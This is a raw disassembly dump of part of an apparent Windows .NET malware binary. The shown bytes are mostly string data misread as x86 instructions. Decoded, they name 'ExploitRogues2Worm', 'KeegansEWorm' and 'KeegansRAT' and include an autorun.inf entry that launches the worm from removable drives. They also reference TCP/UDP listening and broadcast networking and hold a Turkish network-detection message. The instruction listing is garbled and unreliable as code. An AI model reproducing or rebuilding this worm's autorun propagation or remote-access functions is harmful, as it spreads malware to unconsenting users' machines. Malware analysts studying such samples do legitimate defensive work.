10002c0d:	69 73 74 73 00 43 6f 	imul   $0x6f430073,0x74(%ebx),%esi
10002c14:	6e                   	outsb  %ds:(%esi),(%dx)
10002c15:	63 61 74             	arpl   %esp,0x74(%ecx)
10002c18:	00 4f 62             	add    %cl,0x62(%edi)
10002c1b:	6a 65                	push   $0x65
10002c1d:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
10002c21:	65 6c                	gs insb (%dx),%es:(%edi)
10002c23:	66 43                	inc    %bx
10002c25:	6f                   	outsl  %ds:(%esi),(%dx)
10002c26:	6e                   	outsb  %ds:(%esi),(%dx)
10002c27:	6e                   	outsb  %ds:(%esi),(%dx)
10002c28:	65 63 74 00 53       	arpl   %esi,%gs:0x53(%eax,%eax,1)
10002c2d:	79 73                	jns    0x10002ca2
10002c2f:	74 65                	je     0x10002c96
10002c31:	6d                   	insl   (%dx),%es:(%edi)
10002c32:	2e 4e                	cs dec %esi
10002c34:	65 74 00             	gs je  0x10002c37
10002c37:	53                   	push   %ebx
10002c38:	70 6c                	jo     0x10002ca6
10002c3a:	69 74 00 49 73 45 78 	imul   $0x74784573,0x49(%eax,%eax,1),%esi
10002c41:	74 
10002c42:	65 72 6e             	gs jb  0x10002cb3
10002c45:	61                   	popa
10002c46:	6c                   	insb   (%dx),%es:(%edi)
10002c47:	49                   	dec    %ecx
10002c48:	6e                   	outsb  %ds:(%esi),(%dx)
10002c49:	69 74 00 44 69 61 6c 	imul   $0x6f6c6169,0x44(%eax,%eax,1),%esi
10002c50:	6f 
10002c51:	67 52                	addr16 push %edx
10002c53:	65 73 75             	gs jae 0x10002ccb
10002c56:	6c                   	insb   (%dx),%es:(%edi)
10002c57:	74 00                	je     0x10002c59
10002c59:	54                   	push   %esp
10002c5a:	63 70 43             	arpl   %esi,0x43(%eax)
10002c5d:	6c                   	insb   (%dx),%es:(%edi)
10002c5e:	69 65 6e 74 00 55 64 	imul   $0x64550074,0x6e(%ebp),%esp
10002c65:	70 43                	jo     0x10002caa
10002c67:	6c                   	insb   (%dx),%es:(%edi)
10002c68:	69 65 6e 74 00 75 64 	imul   $0x64750074,0x6e(%ebp),%esp
10002c6f:	70 43                	jo     0x10002cb4
10002c71:	6c                   	insb   (%dx),%es:(%edi)
10002c72:	69 65 6e 74 00 45 6e 	imul   $0x6e450074,0x6e(%ebp),%esp
10002c79:	76 69                	jbe    0x10002ce4
10002c7b:	72 6f                	jb     0x10002cec
10002c7d:	6e                   	outsb  %ds:(%esi),(%dx)
10002c7e:	6d                   	insl   (%dx),%es:(%edi)
10002c7f:	65 6e                	outsb  %gs:(%esi),(%dx)
10002c81:	74 00                	je     0x10002c83
10002c83:	49                   	dec    %ecx
10002c84:	50                   	push   %eax
10002c85:	45                   	inc    %ebp
10002c86:	6e                   	outsb  %ds:(%esi),(%dx)
10002c87:	64 50                	fs push %eax
10002c89:	6f                   	outsl  %ds:(%esi),(%dx)
10002c8a:	69 6e 74 00 54 68 72 	imul   $0x72685400,0x74(%esi),%ebp
10002c91:	65 61                	gs popa
10002c93:	64 53                	fs push %ebx
10002c95:	74 61                	je     0x10002cf8
10002c97:	72 74                	jb     0x10002d0d
10002c99:	00 6c 69 73          	add    %ch,0x73(%ecx,%ebp,2)
10002c9d:	74 65                	je     0x10002d04
10002c9f:	6e                   	outsb  %ds:(%esi),(%dx)
10002ca0:	50                   	push   %eax
10002ca1:	6f                   	outsl  %ds:(%esi),(%dx)
10002ca2:	72 74                	jb     0x10002d18
10002ca4:	00 73 65             	add    %dh,0x65(%ebx)
10002ca7:	74 5f                	je     0x10002d08
10002ca9:	45                   	inc    %ebp
10002caa:	6e                   	outsb  %ds:(%esi),(%dx)
10002cab:	61                   	popa
10002cac:	62 6c 65 42          	bound  %ebp,0x42(%ebp,%eiz,2)
10002cb0:	72 6f                	jb     0x10002d21
10002cb2:	61                   	popa
10002cb3:	64 63 61 73          	arpl   %esp,%fs:0x73(%ecx)
10002cb7:	74 00                	je     0x10002cb9
10002cb9:	54                   	push   %esp
10002cba:	6f                   	outsl  %ds:(%esi),(%dx)
10002cbb:	61                   	popa
10002cbc:	73 74                	jae    0x10002d32
10002cbe:	00 53 79             	add    %dl,0x79(%ebx)
10002cc1:	73 74                	jae    0x10002d37
10002cc3:	65 6d                	gs insl (%dx),%es:(%edi)
10002cc5:	2e 54                	cs push %esp
10002cc7:	65 78 74             	gs js  0x10002d3e
10002cca:	00 57 72             	add    %dl,0x72(%edi)
10002ccd:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
10002cd4:	65 
10002cd5:	78 74                	js     0x10002d4b
10002cd7:	00 53 68             	add    %dl,0x68(%ebx)
10002cda:	6f                   	outsl  %ds:(%esi),(%dx)
10002cdb:	77 00                	ja     0x10002cdd
10002cdd:	4d                   	dec    %ebp
10002cde:	65 73 73             	gs jae 0x10002d54
10002ce1:	61                   	popa
10002ce2:	67 65 42             	addr16 gs inc %edx
10002ce5:	6f                   	outsl  %ds:(%esi),(%dx)
10002ce6:	78 00                	js     0x10002ce8
10002ce8:	67 65 74 5f          	addr16 gs je 0x10002d4b
10002cec:	49                   	dec    %ecx
10002ced:	73 52                	jae    0x10002d41
10002cef:	65 61                	gs popa
10002cf1:	64 79 00             	fs jns 0x10002cf4
10002cf4:	41                   	inc    %ecx
10002cf5:	6e                   	outsb  %ds:(%esi),(%dx)
10002cf6:	79 00                	jns    0x10002cf8
10002cf8:	43                   	inc    %ebx
10002cf9:	6f                   	outsl  %ds:(%esi),(%dx)
10002cfa:	70 79                	jo     0x10002d75
10002cfc:	00 43 6f             	add    %al,0x6f(%ebx)
10002cff:	6e                   	outsb  %ds:(%esi),(%dx)
10002d00:	73 6f                	jae    0x10002d71
10002d02:	6c                   	insb   (%dx),%es:(%edi)
10002d03:	65 4c                	gs dec %esp
10002d05:	69 62 72 61 72 79 00 	imul   $0x797261,0x72(%edx),%esp
10002d0c:	67 65 74 5f          	addr16 gs je 0x10002d6f
10002d10:	43                   	inc    %ebx
10002d11:	75 72                	jne    0x10002d85
10002d13:	72 65                	jb     0x10002d7a
10002d15:	6e                   	outsb  %ds:(%esi),(%dx)
10002d16:	74 44                	je     0x10002d5c
10002d18:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
10002d1f:	79 00                	jns    0x10002d21
10002d21:	67 65 74 5f          	addr16 gs je 0x10002d84
10002d25:	52                   	push   %edx
10002d26:	6f                   	outsl  %ds:(%esi),(%dx)
10002d27:	6f                   	outsl  %ds:(%esi),(%dx)
10002d28:	74 44                	je     0x10002d6e
10002d2a:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
10002d31:	79 00                	jns    0x10002d33
10002d33:	6f                   	outsl  %ds:(%esi),(%dx)
10002d34:	70 5f                	jo     0x10002d95
10002d36:	45                   	inc    %ebp
10002d37:	71 75                	jno    0x10002dae
10002d39:	61                   	popa
10002d3a:	6c                   	insb   (%dx),%es:(%edi)
10002d3b:	69 74 79 00 00 00 29 	imul   $0x45290000,0x0(%ecx,%edi,2),%esi
10002d42:	45 
10002d43:	00 72 00             	add    %dh,0x0(%edx)
10002d46:	72 00                	jb     0x10002d48
10002d48:	6f                   	outsl  %ds:(%esi),(%dx)
10002d49:	00 72 00             	add    %dh,0x0(%edx)
10002d4c:	20 00                	and    %al,(%eax)
10002d4e:	43                   	inc    %ebx
10002d4f:	00 6f 00             	add    %ch,0x0(%edi)
10002d52:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10002d56:	3a 00                	cmp    (%eax),%al
10002d58:	20 00                	and    %al,(%eax)
10002d5a:	30 00                	xor    %al,(%eax)
10002d5c:	78 00                	js     0x10002d5e
10002d5e:	30 00                	xor    %al,(%eax)
10002d60:	33 00                	xor    (%eax),%eax
10002d62:	38 00                	cmp    %al,(%eax)
10002d64:	38 00                	cmp    %al,(%eax)
10002d66:	30 00                	xor    %al,(%eax)
10002d68:	30 00                	xor    %al,(%eax)
10002d6a:	00 0f                	add    %cl,(%edi)
10002d6c:	57                   	push   %edi
10002d6d:	00 61 00             	add    %ah,0x0(%ecx)
10002d70:	72 00                	jb     0x10002d72
10002d72:	6e                   	outsb  %ds:(%esi),(%dx)
10002d73:	00 69 00             	add    %ch,0x0(%ecx)
10002d76:	6e                   	outsb  %ds:(%esi),(%dx)
10002d77:	00 67 00             	add    %ah,0x0(%edi)
10002d7a:	00 13                	add    %dl,(%ebx)
10002d7c:	31 00                	xor    %eax,(%eax)
10002d7e:	32 00                	xor    (%eax),%al
10002d80:	37                   	aaa
10002d81:	00 2e                	add    %ch,(%esi)
10002d83:	00 30                	add    %dh,(%eax)
10002d85:	00 2e                	add    %ch,(%esi)
10002d87:	00 30                	add    %dh,(%eax)
10002d89:	00 2e                	add    %ch,(%esi)
10002d8b:	00 31                	add    %dh,(%ecx)
10002d8d:	00 00                	add    %al,(%eax)
10002d8f:	3d 20 00 45 00       	cmp    $0x450020,%eax
10002d94:	78 00                	js     0x10002d96
10002d96:	70 00                	jo     0x10002d98
10002d98:	6c                   	insb   (%dx),%es:(%edi)
10002d99:	00 6f 00             	add    %ch,0x0(%edi)
10002d9c:	69 00 74 00 52 00    	imul   $0x520074,(%eax),%eax
10002da2:	6f                   	outsl  %ds:(%esi),(%dx)
10002da3:	00 67 00             	add    %ah,0x0(%edi)
10002da6:	75 00                	jne    0x10002da8
10002da8:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
10002dac:	32 00                	xor    (%eax),%al
10002dae:	57                   	push   %edi
10002daf:	00 6f 00             	add    %ch,0x0(%edi)
10002db2:	72 00                	jb     0x10002db4
10002db4:	6d                   	insl   (%dx),%es:(%edi)
10002db5:	00 20                	add    %ah,(%eax)
10002db7:	00 53 00             	add    %dl,0x0(%ebx)
10002dba:	65 00 6c 00 66       	add    %ch,%gs:0x66(%eax,%eax,1)
10002dbf:	00 2d 00 43 00 68    	add    %ch,0x68004300
10002dc5:	00 65 00             	add    %ah,0x0(%ebp)
10002dc8:	63 00                	arpl   %eax,(%eax)
10002dca:	6b 00 01             	imul   $0x1,(%eax),%eax
10002dcd:	2d 45 00 78 00       	sub    $0x780045,%eax
10002dd2:	70 00                	jo     0x10002dd4
10002dd4:	6c                   	insb   (%dx),%es:(%edi)
10002dd5:	00 6f 00             	add    %ch,0x0(%edi)
10002dd8:	69 00 74 00 52 00    	imul   $0x520074,(%eax),%eax
10002dde:	6f                   	outsl  %ds:(%esi),(%dx)
10002ddf:	00 67 00             	add    %ah,0x0(%edi)
10002de2:	75 00                	jne    0x10002de4
10002de4:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
10002de8:	32 00                	xor    (%eax),%al
10002dea:	57                   	push   %edi
10002deb:	00 6f 00             	add    %ch,0x0(%edi)
10002dee:	72 00                	jb     0x10002df0
10002df0:	6d                   	insl   (%dx),%es:(%edi)
10002df1:	00 2e                	add    %ch,(%esi)
10002df3:	00 65 00             	add    %ah,0x0(%ebp)
10002df6:	78 00                	js     0x10002df8
10002df8:	65 00 00             	add    %al,%gs:(%eax)
10002dfb:	17                   	pop    %ss
10002dfc:	61                   	popa
10002dfd:	00 75 00             	add    %dh,0x0(%ebp)
10002e00:	74 00                	je     0x10002e02
10002e02:	6f                   	outsl  %ds:(%esi),(%dx)
10002e03:	00 72 00             	add    %dh,0x0(%edx)
10002e06:	75 00                	jne    0x10002e08
10002e08:	6e                   	outsb  %ds:(%esi),(%dx)
10002e09:	00 2e                	add    %ch,(%esi)
10002e0b:	00 69 00             	add    %ch,0x0(%ecx)
10002e0e:	6e                   	outsb  %ds:(%esi),(%dx)
10002e0f:	00 66 00             	add    %ah,0x0(%esi)
10002e12:	00 80 ad 5b 00 41    	add    %al,0x41005bad(%eax)
10002e18:	00 75 00             	add    %dh,0x0(%ebp)
10002e1b:	74 00                	je     0x10002e1d
10002e1d:	6f                   	outsl  %ds:(%esi),(%dx)
10002e1e:	00 72 00             	add    %dh,0x0(%edx)
10002e21:	75 00                	jne    0x10002e23
10002e23:	6e                   	outsb  %ds:(%esi),(%dx)
10002e24:	00 5d 00             	add    %bl,0x0(%ebp)
10002e27:	0a 00                	or     (%eax),%al
10002e29:	6f                   	outsl  %ds:(%esi),(%dx)
10002e2a:	00 70 00             	add    %dh,0x0(%eax)
10002e2d:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
10002e31:	3d 00 45 00 78       	cmp    $0x78004500,%eax
10002e36:	00 70 00             	add    %dh,0x0(%eax)
10002e39:	6c                   	insb   (%dx),%es:(%edi)
10002e3a:	00 6f 00             	add    %ch,0x0(%edi)
10002e3d:	69 00 74 00 52 00    	imul   $0x520074,(%eax),%eax
10002e43:	6f                   	outsl  %ds:(%esi),(%dx)
10002e44:	00 67 00             	add    %ah,0x0(%edi)
10002e47:	75 00                	jne    0x10002e49
10002e49:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
10002e4d:	32 00                	xor    (%eax),%al
10002e4f:	57                   	push   %edi
10002e50:	00 6f 00             	add    %ch,0x0(%edi)
10002e53:	72 00                	jb     0x10002e55
10002e55:	6d                   	insl   (%dx),%es:(%edi)
10002e56:	00 2e                	add    %ch,(%esi)
10002e58:	00 65 00             	add    %ah,0x0(%ebp)
10002e5b:	78 00                	js     0x10002e5d
10002e5d:	65 00 0a             	add    %cl,%gs:(%edx)
10002e60:	00 61 00             	add    %ah,0x0(%ecx)
10002e63:	63 00                	arpl   %eax,(%eax)
10002e65:	74 00                	je     0x10002e67
10002e67:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
10002e6d:	3d 00 52 00 75       	cmp    $0x75005200,%eax
10002e72:	00 6e 00             	add    %ch,0x0(%esi)
10002e75:	20 00                	and    %al,(%eax)
10002e77:	45                   	inc    %ebp
10002e78:	00 78 00             	add    %bh,0x0(%eax)
10002e7b:	70 00                	jo     0x10002e7d
10002e7d:	6c                   	insb   (%dx),%es:(%edi)
10002e7e:	00 6f 00             	add    %ch,0x0(%edi)
10002e81:	69 00 74 00 52 00    	imul   $0x520074,(%eax),%eax
10002e87:	6f                   	outsl  %ds:(%esi),(%dx)
10002e88:	00 67 00             	add    %ah,0x0(%edi)
10002e8b:	75 00                	jne    0x10002e8d
10002e8d:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
10002e91:	32 00                	xor    (%eax),%al
10002e93:	57                   	push   %edi
10002e94:	00 6f 00             	add    %ch,0x0(%edi)
10002e97:	72 00                	jb     0x10002e99
10002e99:	6d                   	insl   (%dx),%es:(%edi)
10002e9a:	00 0a                	add    %cl,(%edx)
10002e9c:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
10002ea0:	00 62 00             	add    %ah,0x0(%edx)
10002ea3:	65 00 6c 00 3d       	add    %ch,%gs:0x3d(%eax,%eax,1)
10002ea8:	00 4b 00             	add    %cl,0x0(%ebx)
10002eab:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
10002eaf:	67 00 61 00          	add    %ah,0x0(%bx,%di)
10002eb3:	6e                   	outsb  %ds:(%esi),(%dx)
10002eb4:	00 73 00             	add    %dh,0x0(%ebx)
10002eb7:	20 00                	and    %al,(%eax)
10002eb9:	57                   	push   %edi
10002eba:	00 6f 00             	add    %ch,0x0(%edi)
10002ebd:	72 00                	jb     0x10002ebf
10002ebf:	6d                   	insl   (%dx),%es:(%edi)
10002ec0:	00 00                	add    %al,(%eax)
10002ec2:	27                   	daa
10002ec3:	45                   	inc    %ebp
10002ec4:	00 78 00             	add    %bh,0x0(%eax)
10002ec7:	70 00                	jo     0x10002ec9
10002ec9:	6c                   	insb   (%dx),%es:(%edi)
10002eca:	00 6f 00             	add    %ch,0x0(%edi)
10002ecd:	69 00 74 00 52 00    	imul   $0x520074,(%eax),%eax
10002ed3:	6f                   	outsl  %ds:(%esi),(%dx)
10002ed4:	00 67 00             	add    %ah,0x0(%edi)
10002ed7:	75 00                	jne    0x10002ed9
10002ed9:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
10002edd:	32 00                	xor    (%eax),%al
10002edf:	57                   	push   %edi
10002ee0:	00 6f 00             	add    %ch,0x0(%edi)
10002ee3:	72 00                	jb     0x10002ee5
10002ee5:	6d                   	insl   (%dx),%es:(%edi)
10002ee6:	00 7c 00 00          	add    %bh,0x0(%eax,%eax,1)
10002eea:	3d 41 00 1f 01       	cmp    $0x11f0041,%eax
10002eef:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
10002ef3:	20 00                	and    %al,(%eax)
10002ef5:	79 00                	jns    0x10002ef7
10002ef7:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
10002efb:	69 00 20 00 57 00    	imul   $0x570020,(%eax),%eax
10002f01:	6f                   	outsl  %ds:(%esi),(%dx)
10002f02:	00 72 00             	add    %dh,0x0(%edx)
10002f05:	6d                   	insl   (%dx),%es:(%edi)
10002f06:	00 20                	add    %ah,(%eax)
10002f08:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
10002f0c:	00 73 00             	add    %dh,0x0(%ebx)
10002f0f:	70 00                	jo     0x10002f11
10002f11:	69 00 74 00 20 00    	imul   $0x200074,(%eax),%eax
10002f17:	65 00 64 00 69       	add    %ah,%gs:0x69(%eax,%eax,1)
10002f1c:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
10002f20:	00 69 00             	add    %ch,0x0(%ecx)
10002f23:	3a 00                	cmp    (%eax),%al
10002f25:	20 00                	and    %al,(%eax)
10002f27:	01 a6 ee 5e ae 7a    	add    %esp,0x7aae5eee(%esi)
10002f2d:	7c 53                	jl     0x10002f82
10002f2f:	4f                   	dec    %edi
10002f30:	a9 3a 5d b9 8c       	test   $0x8cb95d3a,%eax
10002f35:	df 62 0e             	fbld   0xe(%edx)
10002f38:	00 04 20             	add    %al,(%eax,%eiz,1)
10002f3b:	01 01                	add    %eax,(%ecx)
10002f3d:	08 03                	or     %al,(%ebx)
10002f3f:	20 00                	and    %al,(%eax)
10002f41:	01 05 20 01 01 11    	add    %eax,0x11010120
10002f47:	11 04 20             	adc    %eax,(%eax,%eiz,1)
10002f4a:	01 01                	add    %eax,(%ecx)
10002f4c:	0e                   	push   %cs
10002f4d:	06                   	push   %es
10002f4e:	00 02                	add    %al,(%edx)
10002f50:	11 61 0e             	adc    %esp,0xe(%ecx)
10002f53:	0e                   	push   %cs
10002f54:	05 20 02 01 1c       	add    $0x1c010220,%eax
10002f59:	18 05 20 01 01 12    	sbb    %al,0x12010120
10002f5f:	65 04 20             	gs add $0x20,%al
10002f62:	01 01                	add    %eax,(%ecx)
10002f64:	02 04 00             	add    (%eax,%eax,1),%al
10002f67:	00 12                	add    %dl,(%edx)
10002f69:	6d                   	insl   (%dx),%es:(%edi)
10002f6a:	04 20                	add    $0x20,%al
10002f6c:	00 12                	add    %dl,(%edx)
10002f6e:	71 03                	jno    0x10002f73
10002f70:	20 00                	and    %al,(%eax)
10002f72:	0e                   	push   %cs
10002f73:	06                   	push   %es
10002f74:	00 02                	add    %al,(%edx)
10002f76:	01 0e                	add    %ecx,(%esi)
10002f78:	11 79 08             	adc    %edi,0x8(%ecx)
10002f7b:	07                   	pop    %es
10002f7c:	03 12                	add    (%edx),%edx
10002f7e:	51                   	push   %ecx
10002f7f:	12 55 1d             	adc    0x1d(%ebp),%dl
10002f82:	05 05 20 02 01       	add    $0x1022005,%eax
10002f87:	0e                   	push   %cs
10002f88:	08 04 20             	or     %al,(%eax,%eiz,1)
10002f8b:	00 12                	add    %dl,(%edx)
10002f8d:	55                   	push   %ebp
10002f8e:	04 00                	add    $0x0,%al
10002f90:	00 12                	add    %dl,(%edx)
10002f92:	7d 05                	jge    0x10002f99
10002f94:	20 01                	and    %al,(%ecx)
10002f96:	1d 05 0e 07 20       	sbb    $0x20070e05,%eax
10002f9b:	03 01                	add    (%ecx),%eax
10002f9d:	1d 05 08 08 04       	sbb    $0x4080805,%eax
10002fa2:	00 01                	add    %al,(%ecx)
10002fa4:	01 08                	add    %ecx,(%eax)
10002fa6:	0b 07                	or     (%edi),%eax
10002fa8:	06                   	push   %es
10002fa9:	0e                   	push   %cs
10002faa:	1d 12 59 08 12       	sbb    $0x12085912,%eax
10002faf:	59                   	pop    %ecx
10002fb0:	0e                   	push   %cs
10002fb1:	0e                   	push   %cs
10002fb2:	05 00 00 1d 12       	add    $0x121d0000,%eax
10002fb7:	59                   	pop    %ecx
10002fb8:	05 20 00 11 80       	add    $0x80110020,%eax
10002fbd:	89 03                	mov    %eax,(%ebx)
10002fbf:	20 00                	and    %al,(%eax)
10002fc1:	02 05 20 00 12 80    	add    0x80120020,%al
10002fc7:	8d 05 00 02 0e 0e    	lea    0xe0e0200,%eax
10002fcd:	0e                   	push   %cs
10002fce:	04 00                	add    $0x0,%al
10002fd0:	01 02                	add    %eax,(%edx)
10002fd2:	0e                   	push   %cs
10002fd3:	05 00 02 01 0e       	add    $0xe010200,%eax
10002fd8:	0e                   	push   %cs
10002fd9:	08 07                	or     %al,(%edi)
10002fdb:	04 12                	add    $0x12,%al
10002fdd:	5d                   	pop    %ebp
10002fde:	0e                   	push   %cs
10002fdf:	0e                   	push   %cs
10002fe0:	1d 05 04 06 12       	sbb    $0x12060405,%eax
10002fe5:	80 99 07 20 02 01 12 	sbbb   $0x12,0x1022007(%ecx)
10002fec:	80 99 08 04 00 01 0e 	sbbb   $0xe,0x1000408(%ecx)
10002ff3:	0e                   	push   %cs
10002ff4:	08 20                	or     %ah,(%eax)
10002ff6:	03 08                	add    (%eax),%ecx
10002ff8:	1d 05 08 12 5d       	sbb    $0x5d120805,%eax
10002ffd:	0b 07                	or     (%edi),%eax
10002fff:	06                   	push   %es
10003000:	12 2d 12 5d 1d 05    	adc    0x51d5d12,%ch
10003006:	0e                   	push   %cs
10003007:	0e                   	push   %cs
10003008:	0e                   	push   %cs
10003009:	07                   	pop    %es
1000300a:	20 01                	and    %al,(%ecx)
1000300c:	1d 05 10 12 5d       	sbb    $0x5d121005,%eax
10003011:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
10003016:	05 04 20 01 02       	add    $0x2012004,%eax
1000301b:	0e                   	push   %cs
1000301c:	08 20                	or     %ah,(%eax)
1000301e:	02 1d 0e 03 11 80    	add    0x8011030e,%bl
10003024:	a1 05 00 02 02       	mov    0x2020005,%eax
10003029:	0e                   	push   %cs
1000302a:	0e                   	push   %cs
1000302b:	03 00                	add    (%eax),%eax
1000302d:	00 0e                	add    %cl,(%esi)
1000302f:	04 00                	add    $0x0,%al
10003031:	01 01                	add    %eax,(%ecx)
10003033:	0e                   	push   %cs
10003034:	08 7c ec 85          	or     %bh,-0x7b(%esp,%ebp,8)
10003038:	d7                   	xlat   %ds:(%ebx)
10003039:	be a7 79 8e 08       	mov    $0x88e79a7,%esi
1000303e:	b0 3f                	mov    $0x3f,%al
10003040:	5f                   	pop    %edi
10003041:	7f 11                	jg     0x10003054
10003043:	d5 0a                	aad    $0xa
10003045:	3a 03                	cmp    (%ebx),%al
10003047:	06                   	push   %es
10003048:	12 2d 02 06 08 03    	adc    0x3080602,%ch
1000304e:	00 00                	add    %al,(%eax)
10003050:	01 08                	add    %ecx,(%eax)
10003052:	01 00                	add    %eax,(%eax)
10003054:	08 00                	or     %al,(%eax)
10003056:	00 00                	add    %al,(%eax)
10003058:	00 00                	add    %al,(%eax)
1000305a:	1e                   	push   %ds
1000305b:	01 00                	add    %eax,(%eax)
1000305d:	01 00                	add    %eax,(%eax)
1000305f:	54                   	push   %esp
10003060:	02 16                	add    (%esi),%dl
10003062:	57                   	push   %edi
10003063:	72 61                	jb     0x100030c6
10003065:	70 4e                	jo     0x100030b5
10003067:	6f                   	outsl  %ds:(%esi),(%dx)
10003068:	6e                   	outsb  %ds:(%esi),(%dx)
10003069:	45                   	inc    %ebp
1000306a:	78 63                	js     0x100030cf
1000306c:	65 70 74             	gs jo  0x100030e3
1000306f:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
10003076:	77 73                	ja     0x100030eb
10003078:	01 08                	add    %ecx,(%eax)
1000307a:	01 00                	add    %eax,(%eax)
1000307c:	02 00                	add    (%eax),%al
1000307e:	00 00                	add    %al,(%eax)
10003080:	00 00                	add    %al,(%eax)
10003082:	0b 01                	or     (%ecx),%eax
10003084:	00 06                	add    %al,(%esi)
10003086:	4b                   	dec    %ebx
10003087:	45                   	inc    %ebp
10003088:	57                   	push   %edi
10003089:	6f                   	outsl  %ds:(%esi),(%dx)
1000308a:	72 6d                	jb     0x100030f9
1000308c:	00 00                	add    %al,(%eax)
1000308e:	11 01                	adc    %eax,(%ecx)
10003090:	00 0c 4b             	add    %cl,(%ebx,%ecx,2)
10003093:	65 65 67 61          	gs gs addr16 popa
10003097:	6e                   	outsb  %ds:(%esi),(%dx)
10003098:	73 45                	jae    0x100030df
1000309a:	57                   	push   %edi
1000309b:	6f                   	outsl  %ds:(%esi),(%dx)
1000309c:	72 6d                	jb     0x1000310b
1000309e:	00 00                	add    %al,(%eax)
100030a0:	0f 01 00             	sgdtl  (%eax)
100030a3:	0a 4b 65             	or     0x65(%ebx),%cl
100030a6:	65 67 61             	gs addr16 popa
100030a9:	6e                   	outsb  %ds:(%esi),(%dx)
100030aa:	73 52                	jae    0x100030fe
100030ac:	41                   	inc    %ecx
100030ad:	54                   	push   %esp
100030ae:	00 00                	add    %al,(%eax)
100030b0:	17                   	pop    %ss
100030b1:	01 00                	add    %eax,(%eax)
100030b3:	12 45 78             	adc    0x78(%ebp),%al
100030b6:	70 6c                	jo     0x10003124
100030b8:	6f                   	outsl  %ds:(%esi),(%dx)
100030b9:	69 74 52 6f 67 75 65 	imul   $0x73657567,0x6f(%edx,%edx,2),%esi
100030c0:	73 
100030c1:	45                   	inc    %ebp
100030c2:	57                   	push   %edi
100030c3:	6f                   	outsl  %ds:(%esi),(%dx)
100030c4:	72 6d                	jb     0x10003133
100030c6:	00 00                	add    %al,(%eax)
100030c8:	04 01                	add    $0x1,%al
100030ca:	00 00                	add    %al,(%eax)
100030cc:	00 08                	add    %cl,(%eax)
100030ce:	01 00                	add    %eax,(%eax)
100030d0:	0b 00                	or     (%eax),%eax
	...
100030da:	00 00                	add    %al,(%eax)
100030dc:	81 04 c1 9d 00 01 4d 	addl   $0x4d01009d,(%ecx,%eax,8)
100030e3:	50                   	push   %eax
100030e4:	02 00                	add    (%eax),%al
100030e6:	00 00                	add    %al,(%eax)
100030e8:	1c 01                	sbb    $0x1,%al
100030ea:	00 00                	add    %al,(%eax)
100030ec:	10 31                	adc    %dh,(%ecx)
100030ee:	00 00                	add    %al,(%eax)
100030f0:	10 13                	adc    %dl,(%ebx)
	...
100030fa:	00 00                	add    %al,(%eax)
100030fc:	01 00                	add    %eax,(%eax)
100030fe:	00 00                	add    %al,(%eax)
10003100:	13 00                	adc    (%eax),%eax
10003102:	00 00                	add    %al,(%eax)
10003104:	27                   	daa
10003105:	00 00                	add    %al,(%eax)
10003107:	00 2c 32             	add    %ch,(%edx,%esi,1)
1000310a:	00 00                	add    %al,(%eax)
1000310c:	2c 14                	sub    $0x14,%al
1000310e:	00 00                	add    %al,(%eax)
10003110:	52                   	push   %edx
10003111:	53                   	push   %ebx
10003112:	44                   	inc    %esp
10003113:	53                   	push   %ebx
10003114:	7f f5                	jg     0x1000310b
10003116:	35 1e ab 27 5f       	xor    $0x5f27ab1e,%eax
1000311b:	4d                   	dec    %ebp
1000311c:	ac                   	lods   %ds:(%esi),%al
1000311d:	5b                   	pop    %ebx
1000311e:	1d b9 d2 7c 32       	sbb    $0x327cd2b9,%eax
10003123:	f1                   	int1
10003124:	01 00                	add    %eax,(%eax)
10003126:	00 00                	add    %al,(%eax)
10003128:	2f                   	das
10003129:	73 74                	jae    0x1000319f
1000312b:	6f                   	outsl  %ds:(%esi),(%dx)
1000312c:	72 61                	jb     0x1000318f
1000312e:	67 65 2f             	addr16 gs das
10003131:	65 6d                	gs insl (%dx),%es:(%edi)
10003133:	75 6c                	jne    0x100031a1
10003135:	61                   	popa
10003136:	74 65                	je     0x1000319d
10003138:	64 2f                	fs das
1000313a:	30 2f                	xor    %ch,(%edi)
1000313c:	44                   	inc    %esp
1000313d:	6f                   	outsl  %ds:(%esi),(%dx)
1000313e:	77 6e                	ja     0x100031ae
10003140:	6c                   	insb   (%dx),%es:(%edi)
10003141:	6f                   	outsl  %ds:(%esi),(%dx)
10003142:	61                   	popa
10003143:	64 2f                	fs das
10003145:	45                   	inc    %ebp
10003146:	78 70                	js     0x100031b8
10003148:	6c                   	insb   (%dx),%es:(%edi)
10003149:	6f                   	outsl  %ds:(%esi),(%dx)
1000314a:	69 74 52 6f 67 75 65 	imul   $0x73657567,0x6f(%edx,%edx,2),%esi
10003151:	73 
10003152:	32 57 6f             	xor    0x6f(%edi),%dl
10003155:	72 6d                	jb     0x100031c4
10003157:	2f                   	das
10003158:	45                   	inc    %ebp
10003159:	78 70                	js     0x100031cb
1000315b:	6c                   	insb   (%dx),%es:(%edi)
1000315c:	6f                   	outsl  %ds:(%esi),(%dx)
1000315d:	69 74 52 6f 67 75 65 	imul   $0x73657567,0x6f(%edx,%edx,2),%esi
10003164:	73 
10003165:	32 57 6f             	xor    0x6f(%edi),%dl
10003168:	72 6d                	jb     0x100031d7
1000316a:	2f                   	das
1000316b:	62 69 6e             	bound  %ebp,0x6e(%ecx)
1000316e:	2f                   	das
1000316f:	52                   	push   %edx
10003170:	65 6c                	gs insb (%dx),%es:(%edi)
10003172:	65 61                	gs popa
10003174:	73 65                	jae    0x100031db
10003176:	2f                   	das
10003177:	45                   	inc    %ebp
10003178:	78 70                	js     0x100031ea
1000317a:	6c                   	insb   (%dx),%es:(%edi)
